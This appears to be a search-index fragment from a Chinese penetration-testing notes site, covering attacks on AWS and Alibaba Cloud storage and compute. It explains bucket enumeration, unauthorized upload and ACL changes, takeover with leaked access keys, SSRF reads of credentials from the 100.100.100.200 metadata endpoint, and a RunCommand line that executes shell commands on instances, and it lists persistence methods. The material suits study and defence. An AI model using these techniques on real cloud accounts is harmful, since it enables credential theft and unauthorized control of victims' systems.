\u5927\u81f4\u4e5f\u662f\u56f4\u7ed5\u914d\u7f6e\u5931\u8bef\u5c55\u5f00\u7684\uff0c\u611f\u89c9\u62ff\u5230\u63a7\u5236\u53f0\u4e00\u5207\u90fd\u597d\u8bf4\u4e86","title":"\u6a44\u6984AWS\uff01"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E6%A9%84%E6%A6%84AWS%EF%BC%81/%E6%A9%84%E6%A6%84AWS%EF%BC%81/#aws","text":"","title":"\u6a44\u6984AWS\uff01"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E6%A9%84%E6%A6%84AWS%EF%BC%81/%E6%A9%84%E6%A6%84AWS%EF%BC%81/#_1","text":"\u4e91\u670d\u52a1\u76f8\u5173\u7ec4\u4ef6 S3 \u5bf9\u8c61\u5b58\u50a8 EC2\u5f39\u6027\u8ba1\u7b97 RDS\u4e91\u6570\u636e\u5e93 IAM\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406 \u9488\u5bf9\u5404\u7ec4\u4ef6\u7684\u653b\u51fb\u65b9\u5f0f S3\u5bf9\u8c61\u5b58\u50a8 EC2 \u5f39\u6027\u8ba1\u7b97\u670d\u52a1","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E6%A9%84%E6%A6%84AWS%EF%BC%81/%E6%A9%84%E6%A6%84AWS%EF%BC%81/#_2","text":"ref: https://wiki.teamssix.com/CloudService/S3/ \u7531\u4e8e\u5404\u4e2a\u4e91\u5382\u5546\u5bf9\u4e91\u670d\u52a1\u7684\u53eb\u6cd5\u4e0d\u7edf\u4e00\uff0c\u8fd9\u91cc\u5c31\u7edf\u4e00\u4ee5AWS\u7684\u5206\u7c7b\u6765\u53d9\u8ff0\u3002 AWS\u662f\u4ec0\u4e48\uff1f\u7b80\u5355\u7406\u89e3\u4e3a\u4e9a\u9a6c\u900a\u7684\u4e91\u670d\u52a1\u5e73\u53f0\u5c31\u884c\u4e86\u3002","title":"\u4e91\u670d\u52a1\u76f8\u5173\u7ec4\u4ef6"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E6%A9%84%E6%A6%84AWS%EF%BC%81/%E6%A9%84%E6%A6%84AWS%EF%BC%81/#s3","text":"\u8d77\u5230\u4e91\u5b58\u50a8\u7684\u4f5c\u7528\uff0c\u963f\u91cc\u4e91\u7ba1\u8fd9\u4e2a\u53ebOSS\uff0c\u90fd\u4e00\u6837\u3002\u4e5f\u6709\u4e0d\u5c11\u5382\u5546\u76f4\u63a5\u53eb\u5b83\u4e91\u5b58\u50a8\u3002 \u800cAWS\u63d0\u4f9b\u7684\u5bf9\u8c61\u5b58\u50a8\u670d\u52a1\u662f\u57fa\u4e8eS3\u534f\u8bae\u7684\uff0cS3\u534f\u8bae\u5df2\u6210\u4e3a\u4e1a\u754c\u6807\u51c6\uff0c\u56fd\u5185\u4e3b\u6d41\u5bf9\u8c61\u5b58\u50a8\u5382\u5546\u90fd\u652f\u6301S3\u534f\u8bae\u3002 \u4e0b\u56fe\u662f\u5bf9S3\u6807\u51c6\u7684\u4e00\u4e2a\u63cf\u8ff0\u3002\u5927\u81f4\u6709\u4e09\u4e2a\u90e8\u5206\uff1akey\u3001Data\u3001Metadata\uff0c\u8fd9\u4e09\u4e2a\u90e8\u5206\u90fd\u5b58\u50a8\u5728Bucket\u91cc Key\uff1a\u5b58\u50a8\u6876\uff08Bucket\uff09\u4e2d\u67d0\u4e00\u4e2a\u5b58\u50a8\u5bf9\u8c61\u7684\u7684\u552f\u4e00\u6807\u8bc6\u7b26\u3002\u201c\u4f8b\u5982\u4e00\u4e2a URL \u4e3a\uff1a https://teamssix.s3.ap-northeast-2.amazonaws.com/flag\uff0c\u8fd9\u91cc\u7684 teamssix \u662f\u5b58\u50a8\u6876 Bucket \u7684\u540d\u79f0\uff0c/flag \u5c31\u662f Key\u201d Data\uff1a\u6570\u636e\u672c\u4f53 Metadata\uff1a\u5143\u6570\u636e\uff0c\u8bb0\u5f55\u6570\u636e\u7684\u6807\u7b7e\u3001\u63cf\u8ff0\u7b49\u4fe1\u606f\uff0c\u7528\u4e8e\u52a0\u901f\u5bf9\u8c61\u7684\u6392\u5e8f\u3001\u5206\u7c7b\u3001\u67e5\u627e\u3002","title":"S3 \u5bf9\u8c61\u5b58\u50a8"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E6%A9%84%E6%A6%84AWS%EF%BC%81/%E6%A9%84%E6%A6%84AWS%EF%BC%81/#ec2","text":"\u4e91\u4e0a\u7684\u865a\u62df\u673a\u3002\u7b80\u800c\u8a00\u4e4b\u53ef\u4ee5\u7406\u89e3\u4e3aVPS\u3002 \u4e00\u4e9b\u540d\u8bcd\u7684\u89e3\u91ca\uff1a AMI\uff1a Amazon \u7cfb\u7edf\u6620\u50cf \uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u521b\u5efaVPS\u65f6\u6240\u9009\u7684\u521d\u59cb\u955c\u50cf\u3002","title":"EC2\u5f39\u6027\u8ba1\u7b97"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E6%A9%84%E6%A6%84AWS%EF%BC%81/%E6%A9%84%E6%A6%84AWS%EF%BC%81/#rds","text":"\u987e\u540d\u601d\u4e49\uff0c\u4e91\u4e0a\u7684\u6570\u636e\u5e93\u3002 \u90a3\u4e48\u5bf9\u8c61\u5b58\u50a8\u548c\u4e91\u6570\u636e\u5e93\u90fd\u662f\u5b58\u50a8\u6570\u636e\u7684\uff0c\u6709\u4ec0\u4e48\u533a\u522b\u5462\uff1f \u5bf9\u8c61\u5b58\u50a8\u66f4\u591a\u9762\u4e34\u7684\u573a\u666f\u662f\u975e\u7ed3\u6784\u5316\u7684\u6570\u636e\uff0c\u6bd4\u5982\u6587\u4ef6\u3001\u56fe\u7247\u3001\u89c6\u9891\u3002\u6bd4\u5982\u5f88\u591a\u4eba\u5c31\u559c\u6b22\u7528\u963f\u91cc\u4e91oss\u642d\u5efa\u535a\u5ba2\u56fe\u5e8a\u3002 \u800c\u4e91\u6570\u636e\u5e93\u76f4\u63a5\u63d0\u4f9b\u5982mysql\u3001oracle\u7b49\u6570\u636e\u5e93\u7684\u4e91\u4e0a\u7ba1\u7406\u80fd\u529b\u3002","title":"RDS\u4e91\u6570\u636e\u5e93"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E6%A9%84%E6%A6%84AWS%EF%BC%81/%E6%A9%84%E6%A6%84AWS%EF%BC%81/#iam","text":"\u653e\u5728\u4e91\u4e0a\u7684\u8eab\u4efd\u7ba1\u7406\u670d\u52a1 \u4e3e\u4e2a\u5f62\u8c61\u7684\u4f8b\u5b50: \u5f88\u591a\u8bba\u575b\u90fd\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7b2c\u4e09\u65b9\u767b\u5f55\u7684\u63a5\u53e3\uff0c\u6bd4\u5982qq\u767b\u5f55\u3001\u5fae\u4fe1\u767b\u9646\uff0c\u70b9\u51fb\u5e94\u7528\u56fe\u6807\u5373\u53ef\u81ea\u52a8\u767b\u5f55\u8fdb\u5165\u5e94\u7528\uff0c\u4f7f\u7528\u5df2\u88ab\u81ea\u52a8\u6388\u6743\u7684\u529f\u80fd\u3002\u7136\u540e\u7ba1\u7406\u4eba\u5458\u53ef\u4ee5\u5728\u7ba1\u7406\u540e\u53f0\u7edf\u8ba1\u5458\u5de5\u7684\u767b\u5f55\u60c5\u51b5\u3001\u4f7f\u7528\u60c5\u51b5\u3002","title":"IAM\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E6%A9%84%E6%A6%84AWS%EF%BC%81/%E6%A9%84%E6%A6%84AWS%EF%BC%81/#_3","text":"","title":"\u9488\u5bf9\u5404\u7ec4\u4ef6\u7684\u653b\u51fb\u65b9\u5f0f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E6%A9%84%E6%A6%84AWS%EF%BC%81/%E6%A9%84%E6%A6%84AWS%EF%BC%81/#s3_1","text":"https://zone.huoxian.cn/d/907-aws-s3/5 \u5927\u81f4\u5206\u4e3a\uff1a \u00b7\u914d\u7f6e\u5931\u8bef\u5bfc\u81f4ACL\u6216\u8005\u5b58\u50a8\u5bf9\u8c61\u5185\u5bb9\u53ef\u5199\u5165\u3001\u6216\u8005\u4fe1\u606f\u6cc4\u9732 \u00b7key\u6cc4\u9732\u76f4\u63a5\u63a5\u7ba1 \u00b7bucket\u53ef\u63a7\u540e\u9020\u6210\u9493\u9c7c\u3001\u4e1a\u52a1\u762b\u75ea \u00b7\u52ab\u6301\u7f51\u9875\u5b58\u50a8\u5728bucket\u4e2d\u7684js\u4ee3\u7801 \u00b7bucket name \u7206\u7834","title":"S3\u5bf9\u8c61\u5b58\u50a8"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E6%A9%84%E6%A6%84AWS%EF%BC%81/%E6%A9%84%E6%A6%84AWS%EF%BC%81/#ec2_1","text":"https://zone.huoxian.cn/d/1022-aws-ec2 \u5927\u81f4\u4e5f\u662f\u56f4\u7ed5\u914d\u7f6e\u5931\u8bef\u5c55\u5f00\u7684\uff0c\u611f\u89c9\u62ff\u5230\u63a7\u5236\u53f0\u4e00\u5207\u90fd\u597d\u8bf4\u4e86","title":"EC2 \u5f39\u6027\u8ba1\u7b97\u670d\u52a1"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E6%A9%84%E6%A6%84%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1/%E6%A9%84%E6%A6%84%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1/","text":"\u6a44\u6984\u963f\u91cc\u4e91\u670d\u52a1 \u76ee\u5f55 OSS Key\u904d\u5386/\u7206\u7834 \u672a\u6388\u6743\u4e0a\u4f20 \u7b56\u7565\u516c\u5f00\u53ef\u8bfb ACL\u53ef\u8bfb\u5199 AccessKeyId\uff0cSecretAccessKey\u6cc4\u9732 ECS ssrf\u8bfb\u53d6\u7528\u6237\u6570\u636e \u547d\u4ee4\u6267\u884c \u521b\u5efa\u6301\u4e45\u5316ram\u8d26\u53f7 \u5229\u7528\u4e91\u51fd\u6570\u6743\u9650\u7ef4\u6301 \u5229\u7528\u540e\u95e8\u955c\u50cf\u6743\u9650\u7ef4\u6301 \u73af\u5883\u642d\u5efa\uff1a https://github.com/HuoCorp/TerraformGoat OSS OSS\u5373\u963f\u91cc\u4e91\u7684\u5bf9\u8c61\u5b58\u50a8\u670d\u52a1 Key\u904d\u5386/\u7206\u7834 \u5982\u679cBucket\u7684ListObjects\u6743\u9650\u6253\u5f00\u4e86\uff0c\u6388\u6743\u7528\u6237\u7ed9\u7684\u662f\u533f\u540d\u8d26\u53f7\uff08\u5217\u51fakey\u503c\uff09\uff0c\u5e76\u4e14Bucket ACL\u662f\u516c\u5171\u8bfb\u6216\u8005\u516c\u5171\u8bfb\u5199\uff08\u8bbf\u95ee\u8d44\u6e90\uff09\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5728URL\u904d\u5386\u6240\u6709key\u503c\uff0c\u5e76\u8bbf\u95ee\u8fd9\u4e9b\u8d44\u6e90 \u5c31\u50cf\u8fd9\u6837 \u7206\u7834\u5c31\u662f\u76f4\u63a5\u76ee\u5f55\u7206\u7834\u4e86\uff0c\u6ca1\u5565\u597d\u8bf4\u7684\uff0cOSS\u91cckey\u503c\u5c31\u53ef\u4ee5\u7406\u89e3\u4e3a\u6587\u4ef6\u540d \u672a\u6388\u6743\u4e0a\u4f20 \u5982\u679c\u5b58\u50a8\u6876\u914d\u7f6e\u4e3a\u53ef\u5199\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u8fdb\u884c\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 oss\u540e\u53f0\u91cc\u7684Bucket ACL\u8bbe\u7f6e\u4e3a\u516c\u5171\u8bfb\u5199\u540e\u5c31\u53ef\u80fd\u9047\u5230\u8fd9\u79cd\u5b89\u5168\u95ee\u9898 \u53ef\u4ee5\u770b\u5230\u6211\u4eec\u5411\u4e00\u4e2a\u5b58\u50a8\u6876\u91cc\u5199\u5165\u4e86\u4e00\u4e2a\u540d\u4e3atest.txt\u7684\u6587\u4ef6\u4e14\u5185\u5bb9\u4e3aasd\uff0c\u670d\u52a1\u7aef\u8fd4\u56de\u4e86200 \u518d\u6765\u770b\u770b\u5230\u5e95\u4e0a\u4f20\u8fc7\u53bb\u6ca1,\u8bbf\u95ee bucket-url/text.txt\uff0c\u53d1\u73b0\u786e\u5b9e\u662f\u5199\u5165\u4e86 \u4e0d\u4ec5\u5982\u6b64\uff0c\u8fd8\u53ef\u4ee5\u8986\u76d6\u5176\u4ed6\u6587\u4ef6 \u8fd9\u662f\u539f\u672c\u7684object\u5185\u5bb9 \u8986\u76d6 \u53d1\u73b0\u786e\u5b9e\u8986\u76d6\u4e86 \u7b56\u7565\u516c\u5f00\u53ef\u8bfb \u5373\u7b56\u7565\u53ef\u4ee5\u88ab\u4efb\u4f55\u4eba\u8bfb\u5230 oss\u7ed9\u533f\u540d\u5e10\u6237\u5f00\u542f\u4e86GetBucketPolicy GetBucketPolicy (aliyun.com) url?policy ACL\u53ef\u8bfb\u5199 \u5373Object\u7684ACL\u53ef\u4ee5\u88ab\u770b\u89c1\u3001\u53ef\u4ee5\u88ab\u4efb\u610f\u4fee\u6539 \u4e3a\u533f\u540d\u5e10\u53f7\u6253\u5f00\u4e86GetObjectAcl \u548c PutObjectAcl\u540e\u5c31\u4f1a\u51fa\u73b0\u8fd9\u79cd\u95ee\u9898 https://help.aliyun.com/document_detail/31987.html GetObjectAcl https://help.aliyun.com/document_detail/31986.html PutObjectAcl \u8bbf\u95ee bucket_url/objectname?acl \u5373\u53ef\u770b\u5230\u5bf9\u5e94object\u7684acl \u7136\u540e\u4f7f\u7528PUT\u65b9\u6cd5\uff0c\u9644\u5e26x-oss-object-acl \u8bf7\u6c42\u5934\uff0c\u5c31\u80fd\u5bf9\u8bf7\u6c42\u7684object\u7684acl\u8fdb\u884c\u4fee\u6539 PUT\u53d1\u5305\u4ee5\u540e\uff0c\u518d\u6b21\u67e5\u770b\u5bf9\u5e94object\u7684acl\uff0c\u53d8\u6210\u4e86public-read AccessKeyId\uff0cSecretAccessKey\u6cc4\u9732 \u8fd9\u4fe9\u4e1c\u897f\u6cc4\u9732\u4e86\u5c31\u80fd\u76f4\u63a5\u63a5\u7ba1OSS\u4e86\u3002\u5229\u7528\u5de5\u5177 https://github.com/mrknow001/aliyun-accesskey-Tools \u6216\u8005\u4f7f\u7528\u963f\u91cc\u4e91\u63d0\u4f9b\u7684cli\uff08aliyun\uff09 \uff0c\u8f93\u5165 aliyun configure \uff0c\u628aak\u8f93\u8fdb\u53bb\u5c31\u80fd\u7528\u8fd9\u4e2a\u8d26\u53f7\u7684\u5404\u4e2a\u63a5\u53e3API\u4e86 \u4e00\u822c\u4f1a\u5728\u4e0b\u9762\u8fd9\u4e9b\u573a\u666f\u6cc4\u9732\uff1a \u6e90\u7801\u3001\u7f51\u7ad9\u524d\u7aef\u4ee3\u7801\u3001\u53cd\u6c47\u7f16APP \u5f53\u7136\uff0c\u5982\u679c\u63a7\u5236\u53f0\u8d26\u53f7\u5bc6\u7801\u6cc4\u9732\u4e86\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u76f4\u63a5\u63a5\u7ba1\u6240\u6709\u8be5\u8d26\u6237\u4e0a\u7684\u8d44\u6e90\u4e86 ECS ref: https://zone.huoxian.cn/d/1064-ecs ssrf\u8bfb\u53d6\u7528\u6237\u6570\u636e \u5728\u963f\u91cc\u4e91ECS\u91cc \u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee http://100.100.100.200/latest/[metadata] \u6765\u67e5\u770b\u5b9e\u4f8b\u7684\u5143\u6570\u636e\uff0c\u5982meta-data\u67e5\u770b\u6240\u6709\u5143\u6570\u636e\u6839\u76ee\u5f55\uff0cinstance-id\u67e5\u770b\u5b9e\u4f8bid\u7b49\uff0c\u66f4\u591a\u8bf7\u89c1\u5b98\u65b9\u6587\u6863 https://help.aliyun.com/document_detail/108460.html \u5982\u679cECS\u4e0a\u5b58\u5728ssrf\u6f0f\u6d1e\uff0c\u5219\u53ef\u4ee5\u901a\u8fc7\u8bbf\u95ee\u8fd9\u4e2aIP\u6765\u83b7\u53d6\u5143\u6570\u636e \u5982\u679cecs\u7ed1\u5b9a\u4e86ram\u8d26\u6237\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u901a\u8fc7\u8bfb\u53d6\u5143\u6570\u636e\u6765\u8bfb\u53d6ram\u8d26\u6237\u7684ak\uff0c\u4ece\u800c\u63a5\u7ba1\u6b64\u8d26\u6237 100.100.100.200/latest/meta-data/ram/security-credentials \u83b7\u53d6\u7ed1\u5b9a\u7684ram\u8d26\u6237\u540d 100.100.100.200/latest/meta-data/ram/security-credentials/ram_username \u83b7\u53d6ak\u4fe1\u606f \u547d\u4ee4\u6267\u884c \u5728\u6211\u4eec\u83b7\u53d6ak\u540e\uff0c\u5229\u7528aliyun cli \u5373\u53ef\u5feb\u6377\u7684\u5728ecs\u91cc\u6267\u884c\u547d\u4ee4 aliyun ecs DescribeInstances \u83b7\u53d6\u6240\u6709ecs\u5b9e\u4f8b\u4fe1\u606f aliyun ecs RunCommand --InstanceId.1 i-2ze2sfmwdrs1z5xxoumk --RegionId cn-beijing --Type RunShellScript --CommandContent \"touch /tmp/UzJu\" \u6267\u884c\u547d\u4ee4 \u521b\u5efa\u6301\u4e45\u5316ram\u8d26\u53f7 \u5229\u7528\u4e91\u51fd\u6570\u6743\u9650\u7ef4\u6301 \u5229\u7528\u540e\u95e8\u955c\u50cf\u6743\u9650\u7ef4\u6301","title":"\u6a44\u6984\u963f\u91cc\u4e91\u670d\u52a1"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E6%A9%84%E6%A6%84%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1/%E6%A9%84%E6%A6%84%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1/#_1","text":"","title":"\u6a44\u6984\u963f\u91cc\u4e91\u670d\u52a1"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E6%A9%84%E6%A6%84%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1/%E6%A9%84%E6%A6%84%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1/#_2","text":"OSS Key\u904d\u5386/\u7206\u7834 \u672a\u6388\u6743\u4e0a\u4f20 \u7b56\u7565\u516c\u5f00\u53ef\u8bfb ACL\u53ef\u8bfb\u5199 AccessKeyId\uff0cSecretAccessKey\u6cc4\u9732 ECS ssrf\u8bfb\u53d6\u7528\u6237\u6570\u636e \u547d\u4ee4\u6267\u884c \u521b\u5efa\u6301\u4e45\u5316ram\u8d26\u53f7 \u5229\u7528\u4e91\u51fd\u6570\u6743\u9650\u7ef4\u6301 \u5229\u7528\u540e\u95e8\u955c\u50cf\u6743\u9650\u7ef4\u6301 \u73af\u5883\u642d\u5efa\uff1a https://github.com/HuoCorp/TerraformGoat","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E6%A9%84%E6%A6%84%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1/%E6%A9%84%E6%A6%84%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1/#oss","text":"OSS\u5373\u963f\u91cc\u4e91\u7684\u5bf9\u8c61\u5b58\u50a8\u670d\u52a1","title":"OSS"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E6%A9%84%E6%A6%84%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1/%E6%A9%84%E6%A6%84%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1/#key","text":"\u5982\u679cBucket\u7684ListObjects\u6743\u9650\u6253\u5f00\u4e86\uff0c\u6388\u6743\u7528\u6237\u7ed9\u7684\u662f\u533f\u540d\u8d26\u53f7\uff08\u5217\u51fakey\u503c\uff09\uff0c\u5e76\u4e14Bucket ACL\u662f\u516c\u5171\u8bfb\u6216\u8005\u516c\u5171\u8bfb\u5199\uff08\u8bbf\u95ee\u8d44\u6e90\uff09\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5728URL\u904d\u5386\u6240\u6709key\u503c\uff0c\u5e76\u8bbf\u95ee\u8fd9\u4e9b\u8d44\u6e90 \u5c31\u50cf\u8fd9\u6837 \u7206\u7834\u5c31\u662f\u76f4\u63a5\u76ee\u5f55\u7206\u7834\u4e86\uff0c\u6ca1\u5565\u597d\u8bf4\u7684\uff0cOSS\u91cckey\u503c\u5c31\u53ef\u4ee5\u7406\u89e3\u4e3a\u6587\u4ef6\u540d","title":"Key\u904d\u5386/\u7206\u7834"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E6%A9%84%E6%A6%84%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1/%E6%A9%84%E6%A6%84%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1/#_3","text":"\u5982\u679c\u5b58\u50a8\u6876\u914d\u7f6e\u4e3a\u53ef\u5199\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u8fdb\u884c\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 oss\u540e\u53f0\u91cc\u7684Bucket ACL\u8bbe\u7f6e\u4e3a\u516c\u5171\u8bfb\u5199\u540e\u5c31\u53ef\u80fd\u9047\u5230\u8fd9\u79cd\u5b89\u5168\u95ee\u9898 \u53ef\u4ee5\u770b\u5230\u6211\u4eec\u5411\u4e00\u4e2a\u5b58\u50a8\u6876\u91cc\u5199\u5165\u4e86\u4e00\u4e2a\u540d\u4e3atest.txt\u7684\u6587\u4ef6\u4e14\u5185\u5bb9\u4e3aasd\uff0c\u670d\u52a1\u7aef\u8fd4\u56de\u4e86200 \u518d\u6765\u770b\u770b\u5230\u5e95\u4e0a\u4f20\u8fc7\u53bb\u6ca1,\u8bbf\u95ee bucket-url/text.txt\uff0c\u53d1\u73b0\u786e\u5b9e\u662f\u5199\u5165\u4e86 \u4e0d\u4ec5\u5982\u6b64\uff0c\u8fd8\u53ef\u4ee5\u8986\u76d6\u5176\u4ed6\u6587\u4ef6 \u8fd9\u662f\u539f\u672c\u7684object\u5185\u5bb9 \u8986\u76d6 \u53d1\u73b0\u786e\u5b9e\u8986\u76d6\u4e86","title":"\u672a\u6388\u6743\u4e0a\u4f20"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E6%A9%84%E6%A6%84%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1/%E6%A9%84%E6%A6%84%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1/#_4","text":"\u5373\u7b56\u7565\u53ef\u4ee5\u88ab\u4efb\u4f55\u4eba\u8bfb\u5230 oss\u7ed9\u533f\u540d\u5e10\u6237\u5f00\u542f\u4e86GetBucketPolicy GetBucketPolicy (aliyun.com) url?policy","title":"\u7b56\u7565\u516c\u5f00\u53ef\u8bfb"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E6%A9%84%E6%A6%84%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1/%E6%A9%84%E6%A6%84%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1/#acl","text":"\u5373Object\u7684ACL\u53ef\u4ee5\u88ab\u770b\u89c1\u3001\u53ef\u4ee5\u88ab\u4efb\u610f\u4fee\u6539 \u4e3a\u533f\u540d\u5e10\u53f7\u6253\u5f00\u4e86GetObjectAcl \u548c PutObjectAcl\u540e\u5c31\u4f1a\u51fa\u73b0\u8fd9\u79cd\u95ee\u9898 https://help.aliyun.com/document_detail/31987.html GetObjectAcl https://help.aliyun.com/document_detail/31986.html PutObjectAcl \u8bbf\u95ee bucket_url/objectname?acl \u5373\u53ef\u770b\u5230\u5bf9\u5e94object\u7684acl \u7136\u540e\u4f7f\u7528PUT\u65b9\u6cd5\uff0c\u9644\u5e26x-oss-object-acl \u8bf7\u6c42\u5934\uff0c\u5c31\u80fd\u5bf9\u8bf7\u6c42\u7684object\u7684acl\u8fdb\u884c\u4fee\u6539 PUT\u53d1\u5305\u4ee5\u540e\uff0c\u518d\u6b21\u67e5\u770b\u5bf9\u5e94object\u7684acl\uff0c\u53d8\u6210\u4e86public-read","title":"ACL\u53ef\u8bfb\u5199"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E6%A9%84%E6%A6%84%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1/%E6%A9%84%E6%A6%84%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1/#accesskeyidsecretaccesskey","text":"\u8fd9\u4fe9\u4e1c\u897f\u6cc4\u9732\u4e86\u5c31\u80fd\u76f4\u63a5\u63a5\u7ba1OSS\u4e86\u3002\u5229\u7528\u5de5\u5177 https://github.com/mrknow001/aliyun-accesskey-Tools \u6216\u8005\u4f7f\u7528\u963f\u91cc\u4e91\u63d0\u4f9b\u7684cli\uff08aliyun\uff09 \uff0c\u8f93\u5165 aliyun configure \uff0c\u628aak\u8f93\u8fdb\u53bb\u5c31\u80fd\u7528\u8fd9\u4e2a\u8d26\u53f7\u7684\u5404\u4e2a\u63a5\u53e3API\u4e86 \u4e00\u822c\u4f1a\u5728\u4e0b\u9762\u8fd9\u4e9b\u573a\u666f\u6cc4\u9732\uff1a \u6e90\u7801\u3001\u7f51\u7ad9\u524d\u7aef\u4ee3\u7801\u3001\u53cd\u6c47\u7f16APP \u5f53\u7136\uff0c\u5982\u679c\u63a7\u5236\u53f0\u8d26\u53f7\u5bc6\u7801\u6cc4\u9732\u4e86\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u76f4\u63a5\u63a5\u7ba1\u6240\u6709\u8be5\u8d26\u6237\u4e0a\u7684\u8d44\u6e90\u4e86","title":"AccessKeyId\uff0cSecretAccessKey\u6cc4\u9732"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E6%A9%84%E6%A6%84%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1/%E6%A9%84%E6%A6%84%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1/#ecs","text":"ref: https://zone.huoxian.cn/d/1064-ecs","title":"ECS"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E6%A9%84%E6%A6%84%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1/%E6%A9%84%E6%A6%84%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1/#ssrf","text":"\u5728\u963f\u91cc\u4e91ECS\u91cc \u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee http://100.100.100.200/latest/[metadata] \u6765\u67e5\u770b\u5b9e\u4f8b\u7684\u5143\u6570\u636e\uff0c\u5982meta-data\u67e5\u770b\u6240\u6709\u5143\u6570\u636e\u6839\u76ee\u5f55\uff0cinstance-id\u67e5\u770b\u5b9e\u4f8bid\u7b49\uff0c\u66f4\u591a\u8bf7\u89c1\u5b98\u65b9\u6587\u6863 https://help.aliyun.com/document_detail/108460.html \u5982\u679cECS\u4e0a\u5b58\u5728ssrf\u6f0f\u6d1e\uff0c\u5219\u53ef\u4ee5\u901a\u8fc7\u8bbf\u95ee\u8fd9\u4e2aIP\u6765\u83b7\u53d6\u5143\u6570\u636e \u5982\u679cecs\u7ed1\u5b9a\u4e86ram\u8d26\u6237\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u901a\u8fc7\u8bfb\u53d6\u5143\u6570\u636e\u6765\u8bfb\u53d6ram\u8d26\u6237\u7684ak\uff0c\u4ece\u800c\u63a5\u7ba1\u6b64\u8d26\u6237 100.100.100.200/latest/meta-data/ram/security-credentials \u83b7\u53d6\u7ed1\u5b9a\u7684ram\u8d26\u6237\u540d 